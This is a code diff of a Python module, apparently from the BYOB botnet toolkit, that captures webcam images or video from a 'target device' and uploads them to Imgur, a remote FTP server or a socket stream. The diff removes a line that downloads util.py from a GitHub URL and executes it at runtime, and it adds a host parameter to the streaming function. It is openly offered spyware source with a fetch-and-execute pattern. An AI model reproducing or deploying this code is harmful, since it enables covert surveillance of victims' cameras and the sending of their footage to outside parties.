@@ -12,10 +12,11 @@ import socket
 import struct
 import urllib
 
+# packages
+import cv2
+
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import util
 
 # globals
 command = True
@@ -27,10 +28,6 @@ description = """
 Capture image/video from target device's webcam and
 optionally upload it to Imgur or a remote FTP server
 """
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, globals())
 
 # main
 def image(*args, **kwargs):
@@ -67,10 +64,8 @@ def video(*args, **kwargs):
     except Exception as e:
         return '{} error: {}'.format(video.func_name, str(e))
 
-def stream(port=None, retries=5):
+def stream(host=None, port=None, retries=5):
     try:
-        if not port or not str(port).isdigit():
-            return webcam.usage
         host = session['socket'].getpeername()[0]
         port = int(port)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
